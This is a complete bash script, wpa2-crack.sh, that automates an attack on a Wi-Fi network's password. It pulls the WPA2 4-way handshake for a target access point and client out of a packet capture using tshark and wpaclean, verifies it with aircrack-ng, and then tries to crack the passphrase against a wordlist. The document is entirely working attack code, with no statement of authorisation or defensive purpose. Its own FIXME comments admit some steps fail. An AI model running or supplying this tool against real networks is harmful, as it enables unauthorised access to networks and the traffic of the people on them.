#!/bin/bash
# wpa2-crack.sh - A script to automate WPA2 handshake extraction and cracking.
#
# This script:
#   1. Generates a Wireshark filter based on the AP BSSID and Client MAC.
#   2. Applies the filter to a raw pcap file using tshark.
#   3. Cleans the filtered capture with wpaclean (optional).
#   4. Finalizes the capture to ensure the 4-way handshake messages are the last packets.
#   5. Verifies the handshake with aircrack-ng.
#   6. Optionally cracks the handshake using aircrack-ng with a provided wordlist.
#
# Usage:
#   ./wpa2-crack.sh -b <AP_BSSID> -c <CLIENT_MAC> -w <wordlist.txt> -i <raw_capture.pcap> [--skip-filtering] [--cleaning] [-s] [-l]
#
# Options:
#   -b | --bssid        : The BSSID of the Access Point (e.g., 00:14:22:01:23:45)
#   -c | --client       : The Client MAC (e.g., 12:34:56:78:9a:bc)
#   -w | --wordlist     : Path to the wordlist file (e.g., wordlist.txt)
#   -i | --input        : Path to the raw pcap file (e.g., raw_capture.pcap)
#   --skip-filtering    : Skip filtering step if the input pcap is already prepared
#   --cleaning          : Enable cleaning step to prepare the capture file
#   -s | --save         : Save all output files (filters.txt, filtered_capture.pcap, cleaned_handshake.pcap) in a directory
#   -l | --log          : Enable logging to a log file
#   -h | --help         : Display usage information

# Global variables
AP_BSSID=""
CLIENT_MAC=""
WORDLIST=""
INPUT_PCAP=""

FILTER=""
LOGFILE=""
SAVE_DIR=""

SAVE_FILTER=false
SKIP_FILTERING=false
LOGGING_ENABLED=false
CLEANING_ENABLED=false

FILTER_FILE="filters.txt"
FILTERED_PCAP="filtered_capture.pcap"
CLEANED_PCAP="cleaned_handshake.pcap"
FINALIZED_PCAP="finalized_handshake.pcap"

# Define ANSI escape codes for colors and formatting
BOLD="\033[1m"
ITALIC="\033[3m"
CYAN="\033[36m"
GREEN="\033[32m"
RED="\033[31m"
YELLOW="\033[33m"
UNDERLINE="\033[4m"
RESET="\033[0m"

################################
# FIXME: update all log messages
################################

# Log function to append messages with timestamp (only if logging is enabled)
log() {
    if [ "$LOGGING_ENABLED" = true ]; then
        echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOGFILE"
    fi
}

# Print function for user-facing messages
print() {
    echo -e "$1${RESET}"
}

# Function to display usage instructions
usage() {
    cat <<EOF
Usage: $0 -b <AP_BSSID> -c <CLIENT_MAC> -w <wordlist.txt> -i <raw_capture.pcap> [--skip-filtering] [--cleaning] [-s] [-l]

Options:
  -b, --bssid        The BSSID of the Access Point (e.g., 00:14:22:01:23:45)
  -c, --client       The Client MAC (e.g., 12:34:56:78:9a:bc)
  -w, --wordlist     Path to the wordlist file (e.g., wordlist.txt)
  -i, --input        Path to the raw capture pcap file (e.g., raw_capture.pcap)
  --skip-filtering   Skip filtering step if the input pcap is already prepared
  --cleaning         Enable cleaning step to prepare the capture file
  -s, --save         Save all output files (filters.txt, filtered_capture.pcap, cleaned_handshake.pcap) in a directory
  -l, --log          Enable logging to a log file
  -h, --help         Display this help message
EOF
    exit 1
}

# Function to parse command-line arguments
parse_args() {
    if [ "$#" -eq 0 ]; then
        usage
    fi

    while [[ "$#" -gt 0 ]]; do
        case "$1" in
            -b|--bssid)
                AP_BSSID="$2"
                shift 2
                ;;
            -c|--client)
                CLIENT_MAC="$2"
                shift 2
                ;;
            -w|--wordlist)
                WORDLIST="$2"
                shift 2
                ;;
            -i|--input)
                INPUT_PCAP="$2"
                shift 2
                ;;
            --skip-filtering)
                SKIP_FILTERING=true
                shift
                ;;
            --cleaning)
                CLEANING_ENABLED=true
                shift
                ;;
            -s|--save)
                SAVE_FILTER=true
                shift
                ;;
            -l|--log)
                LOGGING_ENABLED=true
                LOGFILE="wpa2_crack_$(date '+%Y%m%d_%H%M%S').log"
                shift
                ;;
            -h|--help)
                usage
                ;;
            *)
                echo "Unknown parameter: $1"
                usage
                ;;
        esac
    done

    # Check required parameters
    if [[ -z "$AP_BSSID" || -z "$WORDLIST" || -z "$INPUT_PCAP" ]]; then
        echo "Error: Missing required parameters."
        usage
    fi
}

# Function to print the title/logo
print_logo() {
    print ""
    print "${BOLD}================================================================================${RESET}"
    print "${BOLD}                              WPA2 CRACKING SCRIPT                              ${RESET}"
    print "${BOLD}${ITALIC}              Automated Handshake Extraction and Password Crack        ${RESET}"
    print "${BOLD}================================================================================${RESET}"
}

# Function to print the parameters
print_parameters() {
    print ""
    print "Starting the process with the following parameters:"
    print "${BOLD}- BSSID:${RESET} ${CYAN}$AP_BSSID${RESET}"
    if [ -n "$CLIENT_MAC" ]; then
        print "${BOLD}- Client MAC:${RESET} ${CYAN}$CLIENT_MAC${RESET}"
    fi
    print "${BOLD}- Wordlist:${RESET} ${CYAN}$WORDLIST${RESET}"
    print "${BOLD}- Input File:${RESET} ${CYAN}$INPUT_PCAP${RESET}"
}

# Function to print a delimiter
print_delimiter() {
    print ""     
    print "================================================================================"
}

# Function to create the save directory if the -s flag is used
create_save_directory() {
    if [ "$SAVE_FILTER" = true ]; then
        SAVE_DIR="wpa2_cracking_$(date '+%Y%m%d_%H%M%S')"
        mkdir -p "$SAVE_DIR"
        log "Created save directory: $SAVE_DIR"
        
        # Move the log file to the save directory if logging is enabled
        if [ "$LOGGING_ENABLED" = true ]; then
            mv "$LOGFILE" "$SAVE_DIR/"
            LOGFILE="$SAVE_DIR/$(basename "$LOGFILE")"  # Update the log file path
            log "Log file moved to $SAVE_DIR/"
        fi
    fi
}

# Function to extract the STA MAC address from the input pcap file
extract_sta_mac() {
    print "${GREEN}\nExtracting the STA MAC address from the input pcap file...${RESET}"
    log "Extracting STA MAC address from $INPUT_PCAP"

    # Extract MAC addresses from EAPOL messages, excluding the AP's MAC address
    STA_MACS=$(tshark -r "$INPUT_PCAP" -Y "eapol && wlan.sa != $AP_BSSID" -T fields -e wlan.sa | sort | uniq -c)

    if [ -z "$STA_MACS" ]; then
        log "Error: No EAPOL messages found in the input pcap file (excluding AP MAC)."
        print "${RED}No EAPOL messages found. Unable to extract STA MAC address.${RESET}"
        exit 1
    fi

    # Check if there is only one unique STA MAC address
    UNIQUE_MAC_COUNT=$(echo "$STA_MACS" | wc -l)
    if [ "$UNIQUE_MAC_COUNT" -eq 1 ]; then
        CLIENT_MAC=$(echo "$STA_MACS" | awk '{print $2}')
        log "Extracted STA MAC address: $CLIENT_MAC"
        print "${BOLD}STA MAC address extracted:${RESET} ${CYAN}$CLIENT_MAC${RESET}"
    else
        log "Multiple STA MAC addresses found in the input pcap file (excluding AP MAC)."
        print "${YELLOW}Multiple STA MAC addresses found:${RESET}"
        echo "$STA_MACS" | awk '{print NR ") " $2 " (" $1 " packets)"}'

        # Prompt the user to select a MAC address or continue automatically
        echo -e ""
        read -p "$(print "${BOLD}${UNDERLINE}Do you want to select a MAC address? (y/N):${RESET}") " confirm
        if [[ "$confirm" =~ ^[Yy]$ ]]; then
            read -p "$(print "${BOLD}Enter the number corresponding to the MAC address:${RESET}") " selection
            CLIENT_MAC=$(echo "$STA_MACS" | awk "NR==$selection {print \$2}")
            if [ -z "$CLIENT_MAC" ]; then
                print "${RED}Invalid selection. Exiting.${RESET}"
                exit 1
            fi
            log "User selected STA MAC address: $CLIENT_MAC"
            print "${BOLD}Selected STA MAC address:${RESET} ${CYAN}$CLIENT_MAC${RESET}"
        else
            # Automatically select the first complete handshake
            CLIENT_MAC=$(echo "$STA_MACS" | awk 'NR==1 {print $2}')
            log "Automatically selected STA MAC address: $CLIENT_MAC"
            print "${BOLD}Automatically selected STA MAC address:${RESET} ${CYAN}$CLIENT_MAC${RESET}"
        fi
    fi
}

# Function to generate Wireshark filter
generate_filter() {

    #########################
    # TODO: check this filter
    #########################

    FILTER="(wlan.fc.type == 0 && wlan.bssid == $AP_BSSID) || 
(wlan.fc.type_subtype == 0x08 && wlan.bssid == $AP_BSSID) || 
(wlan.fc.type_subtype == 0x05 && wlan.sa == $AP_BSSID) || 
(wlan.fc.type_subtype == 0x00 && wlan.sa == $CLIENT_MAC) || 
(wlan.fc.type_subtype == 0x01 && wlan.sa == $CLIENT_MAC) || 
(eapol && (wlan.sa == $AP_BSSID || wlan.sa == $CLIENT_MAC))"
    
    log "Generated filter: $FILTER"
    print "${BOLD}\nWireshark filter generated successfully.${RESET}"
    
    if [ "$SAVE_FILTER" = true ]; then
        echo "$FILTER" > "$SAVE_DIR/$FILTER_FILE"
        log "Filter saved to $SAVE_DIR/$FILTER_FILE"
    fi
}

# Function to filter the raw capture using tshark
filter_capture() {
    print "\nFiltering the raw capture file to extract relevant packets..."
    log "Applying filter to input pcap: $INPUT_PCAP"
    
        tshark -r "$INPUT_PCAP" -Y "$FILTER" -w "$FILTERED_PCAP" -F pcap
    if [ $? -eq 0 ]; then
        log "Filtered capture saved as $FILTERED_PCAP"
        if [ "$SAVE_FILTER" = true ]; then
            mv "$FILTERED_PCAP" "$SAVE_DIR/"
            FILTERED_PCAP="$SAVE_DIR/filtered_capture.pcap"  # Update the path if saved
            log "Filtered capture moved to $SAVE_DIR/"
        fi
    else
        log "Error: tshark failed to filter the capture."
        print "${RED}An error occurred while filtering the capture file. Please check the log file for details.${RESET}"
        exit 1
    fi
}

# Function to clean the filtered capture using wpaclean
clean_capture() {
    print "${GREEN}\nCleaning the filtered capture file to prepare it for handshake verification...${RESET}"
    log "Cleaning capture file: $CLEANED_INPUT"
    
    wpaclean "$CLEANED_PCAP" "$CLEANED_INPUT"
    if [ $? -eq 0 ] && [ -f "$CLEANED_PCAP" ]; then
        log "Cleaned capture saved as $CLEANED_PCAP"
        if [ "$SAVE_FILTER" = true ]; then
            mv "$CLEANED_PCAP" "$SAVE_DIR/"
            CLEANED_PCAP="$SAVE_DIR/cleaned_handshake.pcap"  # Update the path if saved
            log "Cleaned capture moved to $SAVE_DIR/"
        fi
    else
        log "Error: wpaclean failed or did not produce a valid cleaned file."
        print "${RED}An error occurred while cleaning the capture file. Please check the log file for details.${RESET}"
        exit 1
    fi
}

# Function to finalize the capture file
finalize_capture() {
    # print "${GREEN}\nFinalizing the capture file to ensure the 4-way handshake is the last sequence...${RESET}"
    log "Finalizing capture file: $CLEANED_INPUT"

    FINALIZED_PCAP="${SAVE_DIR:-.}/finalized_handshake.pcap"

    # Extract the frame numbers of the 4 EAPOL messages
    EAPOL_FRAMES=$(tshark -r "$CLEANED_INPUT" -Y "eapol" -T fields -e frame.number | tail -n 4)
    if [ -z "$EAPOL_FRAMES" ]; then
        log "Error: No EAPOL messages found in the capture file."
        print "${RED}No EAPOL messages found. Finalization cannot proceed.${RESET}"
        exit 1
    fi

    # Get the last EAPOL frame number
    LAST_EAPOL_FRAME=$(echo "$EAPOL_FRAMES" | tail -n 1)

    # Filter all packets up to and including the last EAPOL frame
    tshark -r "$CLEANED_INPUT" -Y "frame.number <= $LAST_EAPOL_FRAME" -w "$FINALIZED_PCAP" -F pcap
    if [ $? -eq 0 ] && [ -f "$FINALIZED_PCAP" ]; then
        log "Finalized capture saved as $FINALIZED_PCAP"
        if [ "$SAVE_FILTER" = true ]; then
            mv -f "$FINALIZED_PCAP" "$SAVE_DIR/" 2>/dev/null
            FINALIZED_PCAP="$SAVE_DIR/finalized_handshake.pcap"  # Update the path if saved
            log "Finalized capture moved to $SAVE_DIR/"
        fi
    else
        log "Error: Failed to finalize the capture file."
        print "${RED}An error occurred while finalizing the capture file. Please check the log file for details.${RESET}"
        exit 1
    fi
}

# Function to check if the handshake is present using aircrack-ng
check_handshake() {
    if [ ! -f "$FINALIZED_PCAP" ]; then
        log "Error: Finalized handshake file $FINALIZED_PCAP not found."
        print "${RED}The finalized handshake file could not be found. Please ensure the finalizing step was successful.${RESET}"
        exit 1
    fi
    
    print "${GREEN}\nVerifying the handshake in the finalized capture file...${RESET}"
    log "Checking for handshake in $FINALIZED_PCAP"
    aircrack-ng -a2 -b "$AP_BSSID" "$FINALIZED_PCAP" | tee -a "$LOGFILE" # FIXME -> Pre-condition Failed: ap_cur != NULL | (when -l flag is used)
                                                                         #       -> tee: : No such file or directory, Pre-condition Failed: ap_cur != NULL | (when -l flag is not used)
    print "${BOLD}${GREEN}\nHandshake verification complete.${RESET}"
    print "${ITALIC}Please review the output above to confirm if a valid handshake was found.${RESET}"
}

# Function to start cracking using aircrack-ng with the provided wordlist
crack_handshake() {
    print "${GREEN}\nStarting the password cracking process.${RESET}"
    print "${ITALIC}This may take some time depending on the size of your wordlist...${RESET}\n"
    log "Starting cracking process using wordlist: $WORDLIST"
    aircrack-ng -w "$WORDLIST" -b "$AP_BSSID" "$FINALIZED_PCAP" | tee -a "$LOGFILE" # FIXME -> tee: : No such file or directory | (when -l flag is not used)
    print "${BOLD}${GREEN}Password cracking process complete.${RESET}"
    print "${ITALIC}Please review the output above for the results.${RESET}"
}

# Function to remove broken packets from the input pcap file
remove_broken_packets() {
    print "${GREEN}\nRemoving broken packets from the input pcap file...${RESET}"
    log "Removing broken packets from $INPUT_PCAP"

    FIXED_PCAP="fixed_${INPUT_PCAP##*/}"  # Create a new filename for the fixed pcap
    editcap -F pcap "$INPUT_PCAP" "$FIXED_PCAP"
    if [ $? -eq 0 ] && [ -f "$FIXED_PCAP" ]; then
        log "Broken packets removed. Fixed pcap saved as $FIXED_PCAP"
        INPUT_PCAP="$FIXED_PCAP"  # Update INPUT_PCAP to use the fixed file
        if [ "$SAVE_FILTER" = true ]; then
            mv "$FIXED_PCAP" "$SAVE_DIR/"
            INPUT_PCAP="$SAVE_DIR/${FIXED_PCAP##*/}"  # Update path if saved
            log "Fixed pcap moved to $SAVE_DIR/"
        fi
    else
        log "Error: Failed to remove broken packets from the pcap file."
        print "${RED}An error occurred while removing broken packets. Please check the log file for details.${RESET}"
        exit 1
    fi
}

# Main function that calls all the steps
main() {
    parse_args "$@"

    # Extract STA MAC address if not provided
    if [ -z "$CLIENT_MAC" ]; then
        extract_sta_mac
    fi

    print_logo
    print_parameters
    print_delimiter

    if [ "$SAVE_FILTER" = true ]; then
        create_save_directory
    fi

    # Remove broken packets before filtering
    remove_broken_packets

    generate_filter

    if [ "$SKIP_FILTERING" = false ]; then
        filter_capture
        CLEANED_INPUT="${SAVE_DIR:-.}/filtered_capture.pcap"  # Use save directory if -s is active, otherwise current directory
    else
        print "${YELLOW}Skipping the filtering step as requested. Using the provided input file directly.${RESET}"
        CLEANED_INPUT="$INPUT_PCAP"
    fi

    if [ "$CLEANING_ENABLED" = true ]; then
        clean_capture
    fi

    finalize_capture
    check_handshake

    echo -e ""
    read -p "$(print "${BOLD}${UNDERLINE}Do you want to start the password cracking process? (y/N):${RESET}") " confirm
    if [[ "$confirm" =~ ^[Yy]$ ]]; then
        crack_handshake
    else
        print "${RED}\nExiting without starting the password cracking process. Goodbye!${RESET}"
        log "User chose not to start the cracking process."
    fi

    # Remove temporary files if the save flag is not active
    if [ "$SAVE_FILTER" = false ]; then
        print "\nCleaning up temporary files..."
        rm -f $FILTERED_PCAP $CLEANED_PCAP $FINALIZED_PCAP
        log "Temporary files removed as -s flag is not active."
        print "Temporary files have been removed."
    fi
}

# Start the script
main "$@"
